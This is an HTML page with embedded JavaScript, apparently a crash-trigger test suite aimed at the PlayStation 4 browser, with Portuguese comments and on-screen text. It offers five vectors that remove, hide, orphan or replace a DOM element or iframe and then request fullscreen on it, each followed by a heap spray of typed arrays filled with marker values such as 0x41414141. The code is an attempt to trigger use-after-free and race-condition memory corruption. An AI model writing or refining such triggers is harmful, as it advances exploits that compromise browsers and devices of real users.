<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v570000: Delayed Trigger</title>
<style>
    body { background: #000; color: #0ff; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0ff; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #004; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #002; color: #fff; border: 2px solid #0ff;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0ff; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v570000: DELAYED TRIGGER</h1>

<div class="status" id="msg">
    ORDEM: CLIQUE -> ALERTA -> (OK) -> DESTRUIÇÃO + FULLSCREEN<br>
    O CRASH DEVE OCORRER AO CLICAR EM "OK".
</div>

<button onclick="delayed(d01)">01. Removed Element Fullscreen</button>

<button onclick="delayed(d02)">02. Iframe Navigation Race</button>

<button onclick="delayed(d03)">03. Hidden Element Force</button>

<button onclick="delayed(d04)">04. Orphan Child Attack</button>

<button onclick="delayed(d05)">05. Text Node Type Confusion</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global
    let spray = [];
    const pattern = new Uint32Array(1024).fill(0x41414141);

    function delayed(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        
        // 1. Configura o Alvo
        const element = vectorFunc(Stage);
        
        // 2. Dispara a lógica imediatamente (o Alerta estará dentro da função)
        // Usamos setTimeout minúsculo para garantir que o DOM renderizou
        setTimeout(() => {
            if(element.trigger) element.trigger();
        }, 50);
    }

    // =================================================================
    // 01. Removed Element Fullscreen
    // O mais clássico. Cria elemento, alerta, remove, pede fullscreen.
    // =================================================================
    function d01(stage) {
        const d = document.createElement('div');
        d.style.background = "red";
        d.innerText = "ALVO 01";
        d.style.width = "100%"; d.style.height = "100%";
        stage.appendChild(d);

        d.trigger = () => {
            // 1. PAUSA
            window.alert("⚠️ PREPARAR ⚠️\nAo clicar OK: Deletar Elemento -> Entrar Fullscreen.");
            
            // 2. AÇÃO SÍNCRONA (Tudo na mesma fração de segundo)
            d.remove(); // O objeto sai do DOM
            
            // 3. FULLSCREEN NO OBJETO MORTO
            // O navegador tenta animar um retângulo que não existe mais
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.requestFullscreen) d.requestFullscreen();
            
            // 4. SPRAY
            for(let i=0; i<2000; i++) spray.push(new Uint32Array(pattern));
        };
        return d;
    }

    // =================================================================
    // 02. Iframe Navigation Race
    // Cria Iframe. No OK, navega para 'about:blank' (destruindo o contexto)
    // e pede fullscreen no iframe ao mesmo tempo.
    // =================================================================
    function d02(stage) {
        const ifr = document.createElement('iframe');
        ifr.src = "";
        stage.appendChild(ifr);

        ifr.onload = () => {
            ifr.contentDocument.body.innerHTML = "<h1 style='color:red'>IFRAME TARGET</h1>";
            
            ifr.trigger = () => {
                window.alert("⚠️ IFRAME RACE ⚠️\nAo clicar OK: Navegar para Blank -> Fullscreen.");
                
                // 1. Navegação Destrutiva (Limpa a memória do iframe)
                ifr.src = "about:blank";
                
                // 2. Fullscreen no elemento Iframe que está morrendo
                if (ifr.webkitRequestFullscreen) ifr.webkitRequestFullscreen();
                else if (ifr.requestFullscreen) ifr.requestFullscreen();
                
                // 3. Spray
                spray.push(new ArrayBuffer(1024*1024));
            };
        };
        // Hack para retornar o objeto com o trigger correto se onload demorar
        if(!ifr.trigger) ifr.trigger = () => {}; 
        return ifr;
    }

    // =================================================================
    // 03. Hidden Element Force
    // Muda o display para 'none' (tira da árvore de renderização)
    // e força fullscreen. O navegador odeia dar fullscreen em coisas invisíveis.
    // =================================================================
    function d03(stage) {
        const d = document.createElement('div');
        d.style.background = "blue";
        d.innerText = "ALVO INVISÍVEL";
        stage.appendChild(d);

        d.trigger = () => {
            window.alert("⚠️ DISPLAY: NONE ⚠️\nAo clicar OK: Esconder -> Fullscreen.");
            
            // 1. Esconde
            d.style.display = "none";
            
            // 2. Fullscreen
            if (d.webkitRequestFullscreen) d.webkitRequestFullscreen();
            else if (d.requestFullscreen) d.requestFullscreen();
            
            // 3. Força Reflow (Cálculo de layout em elemento oculto)
            const force = d.offsetHeight; 
        };
        return d;
    }

    // =================================================================
    // 04. Parent Detach (Orphan Child)
    // Pede Fullscreen num FILHO, mas remove o PAI do DOM.
    // O filho ainda existe na memória, mas não tem conexão com a janela.
    // =================================================================
    function d04(stage) {
        const parent = document.createElement('div');
        const child = document.createElement('div');
        child.innerText = "FILHO ÓRFÃO";
        child.style.background = "green";
        child.style.padding = "50px";
        
        parent.appendChild(child);
        stage.appendChild(parent);

        parent.trigger = () => {
            window.alert("⚠️ ORPHAN MODE ⚠️\nAo clicar OK: Remover Pai -> Fullscreen no Filho.");
            
            // 1. Remove o PAI
            parent.remove();
            
            // 2. Fullscreen no FILHO (que agora está flutuando no limbo)
            if (child.webkitRequestFullscreen) child.webkitRequestFullscreen();
            else if (child.requestFullscreen) child.requestFullscreen();
            
            // 3. Spray
            for(let i=0; i<1000; i++) spray.push(new Float64Array(100).fill(1.1));
        };
        return parent;
    }

    // =================================================================
    // 05. Text Node Type Confusion
    // Tenta substituir o elemento visual por um nó de texto simples
    // exatamente no momento do Fullscreen.
    // =================================================================
    function d05(stage) {
        const container = document.createElement('div');
        const target = document.createElement('div');
        target.innerText = "ALVO VISUAL";
        target.style.background = "purple";
        container.appendChild(target);
        stage.appendChild(container);

        container.trigger = () => {
            window.alert("⚠️ TYPE SWAP ⚠️\nAo clicar OK: Trocar por Texto -> Fullscreen.");
            
            // 1. Pede Fullscreen no alvo ORIGINAL
            if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
            else if (target.requestFullscreen) target.requestFullscreen();
            
            // 2. IMEDIATAMENTE (Race Condition)
            // Substitui o elemento HTML por um Nó de Texto Puro
            container.innerHTML = "APENAS TEXTO"; 
            
            // O navegador tenta expandir 'target', mas 'target' foi desconectado
            // e o espaço dele foi ocupado por texto cru.
            
            // 3. Spray
            spray.push(new Uint32Array(5000).fill(0xDEADBEEF));
        };
        return container;
    }

</script>
</body>
</html>
